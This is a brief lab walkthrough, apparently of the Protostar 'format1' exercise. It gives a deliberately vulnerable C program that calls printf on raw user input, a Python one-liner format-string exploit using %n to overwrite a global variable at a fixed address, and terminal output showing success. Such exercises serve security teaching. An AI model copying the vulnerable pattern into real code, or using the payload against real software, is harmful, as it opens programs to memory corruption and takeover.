Source:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

Type the following: `python -c "print 'AAAA'+'\x38\x96\x04\x08'*6+'%x_'*130+'%n'" | xargs ./format1`

Sample output:
```bash
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA'+'\x38\x96\x04\x08'*6+'%x_'*130+'%n'" | xargs ./format1
AAAA8�8�8�8�8�8�804960c_bffff638_8048469_b7fd8304_b7fd7ff4_bffff638_8048435_bffff808_b7ff1040_804845b_b7fd7ff4_8048450_0_bffff6b8_b7eadc76_2_bffff6e4_bffff6f0_b7fe1848_bffff6a0_ffffffff_b7ffeff4_804824d_1_bffff6a0_b7ff0626_b7fffab0_b7fe1b28_b7fd7ff4_0_0_bffff6b8_52ea50a6_78bea6b6_0_0_0_2_8048340_0_b7ff6210_b7eadb9b_b7ffeff4_2_8048340_0_8048361_804841c_2_bffff6e4_8048450_8048440_b7ff1040_bffff6dc_b7fff8f8_2_bffff7fe_bffff808_0_bffff9ad_bffff9c1_bffff9d1_bffff9f3_bffffa06_bffffa10_bfffff00_bfffff14_bfffff52_bfffff69_bfffff7a_bfffff82_bfffff92_bfffff9f_bfffffd5_bfffffe6_0_20_b7fe2414_21_b7fe2000_10_f8bfbff_6_1000_11_64_3_8048034_4_20_5_7_7_b7fe3000_8_0_9_8048340_b_3e9_c_0_d_3e9_e_3e9_17_1_19_bffff7db_1f_bffffff2_f_bffff7eb_0_0_0_1c000000_683bdc2c_a9ecd683_8069b5d9_69b5b609_363836_0_0_0_2f2e0000_6d726f66_317461_41414141_you have modified the target :)
```
